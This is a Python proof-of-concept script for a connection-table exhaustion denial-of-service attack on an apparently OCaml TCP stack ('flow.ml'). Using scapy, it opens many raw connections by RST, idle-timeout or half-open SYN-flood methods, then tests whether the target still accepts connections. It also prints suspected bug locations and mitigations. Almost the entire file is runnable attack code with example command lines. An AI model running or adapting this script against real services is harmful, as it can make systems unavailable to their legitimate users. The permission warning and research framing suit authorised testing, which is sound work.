#!/usr/bin/env python3
"""
Connection Table Exhaustion DoS PoC

Demonstrates incomplete resource cleanup leading to connection table exhaustion.
Issues in flow.ml cause connections to linger in hash tables after RST or timeout,
eventually filling the connection table and preventing new connections.

This PoC:
1. Opens many connections to the target
2. Sends RST or lets them timeout
3. Checks if connections are properly cleaned up
4. Attempts new connection to verify service availability

Author: Security Research
License: Educational/Research Use Only
"""

import argparse
import sys
import time
import socket
import threading
from scapy.all import *

class ConnectionExhaustion:
    def __init__(self, target_ip, target_port, num_connections=1000, method='rst'):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.method = method  # 'rst', 'timeout', or 'half-open'
        self.connections = []
        self.successful = 0
        self.failed = 0

    def create_connection(self, source_port):
        """Create a single TCP connection"""
        try:
            ip = IP(dst=self.target_ip)
            syn = TCP(sport=source_port, dport=self.target_port,
                     flags='S', seq=random.randint(1000, 100000))

            syn_ack = sr1(ip/syn, timeout=2, verbose=0)

            if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 'SA':
                # Complete handshake
                ack = TCP(sport=source_port, dport=self.target_port,
                         flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
                send(ip/ack, verbose=0)

                return {
                    'sport': source_port,
                    'seq': syn_ack[TCP].ack,
                    'ack': syn_ack[TCP].seq + 1,
                    'established': True
                }
            return None

        except Exception as e:
            return None

    def create_half_open(self, source_port):
        """Create half-open connection (SYN sent, no ACK)"""
        try:
            ip = IP(dst=self.target_ip)
            syn = TCP(sport=source_port, dport=self.target_port,
                     flags='S', seq=random.randint(1000, 100000))

            syn_ack = sr1(ip/syn, timeout=2, verbose=0)

            if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == 'SA':
                # Don't send ACK - leave connection half-open
                return {
                    'sport': source_port,
                    'seq': syn_ack[TCP].ack,
                    'ack': syn_ack[TCP].seq + 1,
                    'established': False
                }
            return None

        except Exception as e:
            return None

    def send_rst(self, conn):
        """Send RST to close connection"""
        ip = IP(dst=self.target_ip)
        rst = TCP(sport=conn['sport'], dport=self.target_port,
                 flags='R', seq=conn['seq'], ack=conn['ack'])
        send(ip/rst, verbose=0)

    def exhaust_connections(self):
        """Create many connections to exhaust the connection table"""
        print(f"\n[*] Creating {self.num_connections} connections using '{self.method}' method")
        print("[*] This may take a while...\n")

        start_time = time.time()
        base_port = random.randint(10000, 30000)

        for i in range(self.num_connections):
            source_port = base_port + i

            if source_port > 65535:
                print("[-] Ran out of source ports")
                break

            # Create connection based on method
            if self.method == 'half-open':
                conn = self.create_half_open(source_port)
            else:
                conn = self.create_connection(source_port)

            if conn:
                self.connections.append(conn)
                self.successful += 1

                # Apply cleanup method
                if self.method == 'rst' and conn.get('established'):
                    self.send_rst(conn)
                # For 'timeout' we just leave them
                # For 'half-open' they're already in SYN-RCVD state

            else:
                self.failed += 1

            # Progress indicator
            if (i + 1) % 50 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed if elapsed > 0 else 0
                progress = ((i + 1) / self.num_connections) * 100
                print(f"\r[*] Progress: {progress:.1f}% | "
                      f"Created: {self.successful} | Failed: {self.failed} | "
                      f"Rate: {rate:.1f} conn/s",
                      end='', flush=True)

        elapsed = time.time() - start_time
        print(f"\n\n[+] Created {self.successful} connections in {elapsed:.2f} seconds")
        print(f"[+] Average rate: {self.successful / elapsed:.2f} connections/sec")
        print(f"[-] Failed: {self.failed} connections")

    def test_new_connection(self):
        """Test if a new connection can be established"""
        print("\n[*] Testing if new connections can be established...")

        test_port = random.randint(40000, 50000)

        # Try using socket for cleaner test
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, self.target_port))
            print("[+] New connection SUCCESSFUL")
            print("[+] Service is still accepting connections")
            sock.close()
            return True
        except socket.timeout:
            print("[-] Connection TIMEOUT")
            print("[-] Service may be exhausted or overloaded")
            return False
        except socket.error as e:
            print(f"[-] Connection FAILED: {e}")
            print("[-] Service may be exhausted or refusing connections")
            return False

    def test_multiple_new_connections(self, count=10):
        """Try to establish multiple new connections"""
        print(f"\n[*] Attempting {count} new connections...")

        successful = 0
        failed = 0

        for i in range(count):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                successful += 1
                sock.close()
            except:
                failed += 1

            if (i + 1) % 5 == 0:
                print(f"\r[*] Progress: {i+1}/{count} | Success: {successful} | Failed: {failed}",
                      end='', flush=True)

        print(f"\n\n[+] Successfully established {successful}/{count} connections")
        print(f"[-] Failed to establish {failed}/{count} connections")

        if failed > count / 2:
            print("\n[!] VULNERABLE: High failure rate indicates resource exhaustion")
            return False
        elif failed > 0:
            print("\n[~] DEGRADED: Some failures, service may be under stress")
            return None
        else:
            print("\n[+] HEALTHY: All connections successful")
            return True

    def analyze_impact(self):
        """Analyze the attack impact"""
        print("\n" + "="*60)
        print("ATTACK ANALYSIS")
        print("="*60)
        print(f"Method:               {self.method}")
        print(f"Connections Created:  {self.successful}")
        print(f"Connections Failed:   {self.failed}")
        print()

        if self.method == 'rst':
            print("METHOD: RST-based exhaustion")
            print("  - Connections established then immediately RST")
            print("  - Tests if PCBs are properly removed from hash tables")
            print("  - Bug location: flow.ml:251-267 (clearpcb function)")
            print()
            print("EXPECTED BEHAVIOR (vulnerable):")
            print("  - Connections linger in 'channels' or 'listens' table")
            print("  - Stats.decr_channel() may not be called")
            print("  - New connections fail with 'connection refused'")

        elif self.method == 'timeout':
            print("METHOD: Timeout-based exhaustion")
            print("  - Connections established but left idle")
            print("  - Tests timeout cleanup mechanisms")
            print("  - Related to keepalive and finwait2 timers")
            print()
            print("EXPECTED BEHAVIOR (vulnerable):")
            print("  - Connections stay in ESTABLISHED state indefinitely")
            print("  - No timeout mechanism cleans them up")
            print("  - Connection table fills up slowly")

        elif self.method == 'half-open':
            print("METHOD: Half-open (SYN-RCVD) exhaustion")
            print("  - SYN-ACK sent but never acknowledged")
            print("  - Tests incomplete connection cleanup")
            print("  - Targets the 'listens' hash table")
            print()
            print("EXPECTED BEHAVIOR (vulnerable):")
            print("  - Connections stuck in Syn_rcvd state")
            print("  - Listens table fills up")
            print("  - Classic SYN flood variant")

        print()
        print("RESOURCE CONSUMPTION:")
        print(f"  Estimated memory per connection: ~1-4 KB")
        print(f"  Total estimated memory leak:     ~{(self.successful * 2) / 1024:.1f} MB")
        print()
        print("MITIGATION:")
        print("  1. Ensure clearpcb() removes from all hash tables")
        print("  2. Add connection timeouts (ESTABLISHED, SYN-RCVD)")
        print("  3. Implement connection limits per source IP")
        print("  4. Add GC/cleanup sweeps for lingering connections")
        print("="*60)

    def run_attack(self):
        """Execute the full attack sequence"""
        # Create many connections
        self.exhaust_connections()

        # Wait a bit for cleanup to happen (or not)
        print("\n[*] Waiting 5 seconds for cleanup...")
        time.sleep(5)

        # Test if new connections work
        result = self.test_multiple_new_connections(10)

        # Wait a bit more
        print("\n[*] Waiting 10 more seconds...")
        time.sleep(10)

        # Test again
        print("\n[*] Testing again after 15 seconds total...")
        result2 = self.test_new_connection()

        # Analyze
        self.analyze_impact()

        # Verdict
        print("\n" + "="*60)
        print("VULNERABILITY ASSESSMENT")
        print("="*60)

        if result is False or result2 is False:
            print("[!] VULNERABLE")
            print("    Connections are not being properly cleaned up.")
            print("    Service is degraded or unavailable after attack.")
            print("    Connection table exhaustion confirmed.")
        elif result is None:
            print("[~] POSSIBLY VULNERABLE")
            print("    Some connection failures observed.")
            print("    Service may be under stress or slowly leaking resources.")
            print("    Recommend longer test duration.")
        else:
            print("[+] NOT VULNERABLE (to this attack)")
            print("    Connections appear to be cleaned up properly.")
            print("    Service remains available after attack.")

        print("="*60)

def main():
    parser = argparse.ArgumentParser(
        description='Connection Table Exhaustion DoS PoC',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # RST-based exhaustion (tests immediate cleanup)
  sudo python3 connection_exhaustion.py --target 10.0.0.2 --port 8080 --connections 500 --method rst

  # Timeout-based exhaustion (tests idle connection cleanup)
  sudo python3 connection_exhaustion.py --target 10.0.0.2 --port 8080 --connections 1000 --method timeout

  # Half-open (SYN flood variant)
  sudo python3 connection_exhaustion.py --target 10.0.0.2 --port 8080 --connections 1000 --method half-open

Attack Methods:
  rst       - Establish connections then immediately RST them
  timeout   - Establish connections and leave them idle
  half-open - Send SYN, receive SYN-ACK, but never send final ACK

Warning:
  This attack can exhaust connection tables and make services unavailable.
  Only use against systems you own or have permission to test.
        """)

    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target TCP port')
    parser.add_argument('--connections', type=int, default=1000,
                       help='Number of connections to create (default: 1000)')
    parser.add_argument('--method', choices=['rst', 'timeout', 'half-open'],
                       default='rst', help='Attack method (default: rst)')

    args = parser.parse_args()

    # Validate
    if args.connections <= 0 or args.connections > 60000:
        print("[-] Connections must be between 1 and 60000")
        sys.exit(1)

    # Check for root
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        print("[-] Please run with sudo")
        sys.exit(1)

    print("""
╔═══════════════════════════════════════════════════════════╗
║        Connection Table Exhaustion DoS PoC                ║
║        Resource Cleanup Vulnerability Test                ║
╚═══════════════════════════════════════════════════════════╝
""")

    print(f"Target:       {args.target}:{args.port}")
    print(f"Connections:  {args.connections}")
    print(f"Method:       {args.method}")
    print()

    # Confirm
    try:
        confirm = input("Proceed with attack? [y/N]: ")
        if confirm.lower() != 'y':
            print("Aborted.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAborted.")
        sys.exit(0)

    # Run attack
    attacker = ConnectionExhaustion(args.target, args.port,
                                    args.connections, args.method)
    attacker.run_attack()

if __name__ == '__main__':
    main()
